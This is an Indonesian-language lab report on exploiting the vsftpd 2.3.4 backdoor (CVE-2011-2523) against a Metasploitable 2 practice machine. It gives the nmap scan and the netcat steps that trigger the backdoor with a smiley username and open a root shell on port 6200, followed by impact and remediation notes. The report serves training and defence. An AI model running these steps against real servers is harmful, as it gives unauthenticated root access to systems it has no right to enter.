# Skenario Serangan: Eksploitasi vsftpd 2.3.4 Backdoor

**Tanggal:** 5 Mei 2026  
**Target:** Metasploitable 2 (192.168.56.101)  
**Penyerang:** Debian (192.168.56.1)  
**Kerentanan:** CVE-2011-2523 (vsftpd 2.3.4 backdoor)  
**Dampak:** Remote root shell tanpa autentikasi

---

## 1. Enumerasi
Menggunakan Nmap untuk pemindaian port dan versi:

```
nmap -sV -p- 192.168.56.101
```

![[nmap-scan.png]]

Hasil pada port 21:

```
21/tcp open  ftp     vsftpd 2.3.4
```


## 2. Eksploitasi

Backdoor vsftpd 2.3.4 membuka shell di port 6200 saat login dengan username khusus.

Trigger Backdoor:
```
nc 192.168.56.101 21
USER test:)
PASS pass
```

lalu mengakses shell root:

```
nc 192.168.56.101 6200
whoami
```

![[vsftpd-shell.png]]

## 3. Dampak

- Penyerang dapat masuk ke sistem dengan kontrol penuh tanpa melewati autentikasi.
- Kerentanan ini muncul karena modifikasi kode sumber vsftpd oleh oknum tak bertanggung jawab.
- selalu perbarui software untuk memperoleh kemanan yang ter-update.


## 4. Solusi Perbaikan

- Hapus vsftpd yang sudah rentan lalu menggunakan versi resmi yang terbaru.
- Rutin memeriksa kerentanan tiap saat.
- Membatasi akses FTP hanya ke jaringan lokal.